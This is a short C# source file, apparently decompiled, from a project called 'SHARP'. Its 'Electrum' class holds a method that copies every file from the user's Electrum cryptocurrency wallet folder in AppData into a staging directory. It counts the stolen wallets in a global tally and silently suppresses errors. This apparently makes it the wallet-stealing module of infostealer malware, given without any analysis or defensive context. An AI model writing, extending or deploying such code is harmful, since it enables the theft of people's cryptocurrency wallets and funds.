﻿using System;
using System.IO;

namespace SHARP
{
	// Token: 0x02000032 RID: 50
	internal class Electrum
	{
		// Token: 0x060000FB RID: 251 RVA: 0x0000604C File Offset: 0x0000424C
		public static void EleStr(string directorypath)
		{
			try
			{
				foreach (FileInfo fileInfo in new DirectoryInfo(Help.AppData + "\\Electrum\\wallets").GetFiles())
				{
					Directory.CreateDirectory(directorypath + Electrum.ElectrumDir);
					fileInfo.CopyTo(directorypath + Electrum.ElectrumDir + fileInfo.Name);
				}
				Electrum.count++;
				Counting.Wallets++;
			}
			catch
			{
			}
		}

		// Token: 0x0400007C RID: 124
		public static int count = 0;

		// Token: 0x0400007D RID: 125
		public static string ElectrumDir = "\\Wallets\\Electrum\\";
	}
}
